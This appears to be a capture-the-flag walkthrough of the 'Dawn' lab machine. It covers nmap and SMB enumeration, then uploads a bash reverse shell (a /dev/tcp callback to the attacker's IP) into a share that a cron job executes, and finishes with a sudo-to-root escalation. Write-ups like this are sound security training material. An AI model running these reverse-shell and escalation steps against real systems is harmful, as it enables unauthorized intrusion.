@@ -1,0 +1,99 @@
+I start off with an nmap scan:
+
+└─# nmap -sC -sV 192.168.167.11
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.15-MariaDB-1
+|   Thread ID: 15
+|   Capabilities flags: 63486
+|   Some Capabilities: ODBCClient, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, Support41Auth, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: /kO,)*6oQ$^1v~9@r@&=
+|_  Auth Plugin Name: mysql_native_password
+Service Info: Host: DAWN
+
+Host script results:
+|_clock-skew: mean: 1h21m36s, deviation: 2h18m34s, median: 1m35s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: dawn
+|   NetBIOS computer name: DAWN\x00
+|   Domain name: dawn
+|   FQDN: dawn.dawn
+|_  System time: 2022-03-18T00:17:08-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-18T04:17:11
+|_  start_date: N/A
+
+Directory bruteforcing:
+└─# gobuster dir -u http://192.168.167.11 -w /usr/share/wordlists/directory-list-2.3-medium.txt 
+===============================================================
+/logs                 (Status: 301) [Size: 315] [--> http://192.168.167.11/logs/]
+/cctv
+
+Samba shares checks:
+└─# smbclient -L //192.168.167.11
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
+	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+SMB1 disabled -- no workgroup available
+
+Nothing left on the ITDEPT share
+smb: \> dir
+  .                                   D        0  Sat Aug  3 06:23:20 2019
+  ..                                  D        0  Wed Jul 22 20:19:41 2020
+
+So I visit the site and try to access what is there. Only Management log file is accessible and checking the cron jobs logs the following stands out.
+2020/08/12 09:42:01 CMD: UID=0    PID=1674   | /usr/sbin/CRON -f 
+2020/08/12 09:42:01 CMD: UID=33   PID=1683   | /bin/sh -c /home/dawn/ITDEPT/web-control
+
+So if I drop a reverse shell on ITDEPT directory then very high chances to get a callback. This is achieved by uploading the reverse shell on ITDEPT folder.
+The script looks as below:
+#!/bin/bash
+
+bash >& /dev/tcp/192.168.49.167/9001 0>&1
+
+Then setup a netcat listener like:
+nc -lvnp 9001 and sure enough get a callback
+└─# nc -lvnp 9001
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Now moving forward to escalate the privileges.
+www-data@dawn:/home/dawn$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on dawn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on dawn:
+    (root) NOPASSWD: /usr/bin/sudo
+  
+ www-data@dawn:/home/dawn$ sudo -u root sudo bash -p
+sudo -u root sudo bash -p
+root@dawn:/home/dawn# whoami
+whoami
+root
+root@dawn:/home/dawn# id
+id
+
+And the box is rooted!
